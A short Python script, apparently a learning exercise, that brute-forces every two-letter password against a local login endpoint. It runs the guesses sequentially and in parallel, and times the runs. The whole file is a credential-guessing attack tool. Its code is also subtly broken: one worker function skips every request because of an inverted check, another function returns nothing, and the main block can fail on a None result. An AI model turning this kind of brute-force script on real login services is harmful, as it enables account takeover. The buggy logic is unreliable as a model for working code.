from string import ascii_letters
from multiprocessing import Pool, Value
import os
import requests
import time

def find_combinations():
    for a in ascii_letters:
        for b in ascii_letters:    
            yield a + b
            
def send_request(password):
    response = requests.post('http://127.0.0.1:5000/auth',json={"password": password}, headers = {'Content-Type': 'application/json'})
    print(password + '=' + str(response.status_code))
    return response.status_code == 200

def timing(f):
    def wrap(*args):
        time1 = time.time()
        ret = f(*args)
        time2 = time.time()
        print('{:s} function took {:.3f} ms'.format(f.__name__, (time2-time1)*1000.0))

        return ret
    return wrap

@timing
def sequential_hack():
    for password in find_combinations():
        if send_request(password):
            return password
    
    return None


def attempt(p):
    return {p: send_request(p)}

@timing
def parallel_late_hack():
    with Pool(os.cpu_count()) as p:
        return p.map(attempt, list(find_combinations()))


def attempt_new(i, p, store):
    if store.value == -1:
        return
    if send_request(p):
        store.value = i

def parallel_late_hack_new():
    pool = Pool(3)
    value = Value('i', -1)
    passwords = list(find_combinations())
    for i in range(len(passwords)):
        pool.apply_async(attempt_new, args=(i, passwords[i], value))

    pool.close()
    pool.join()

    print(passwords[value.value])

if __name__ == '__main__':
    print("password=" + sequential_hack())
    print("password=" + str(parallel_late_hack_new()))

    
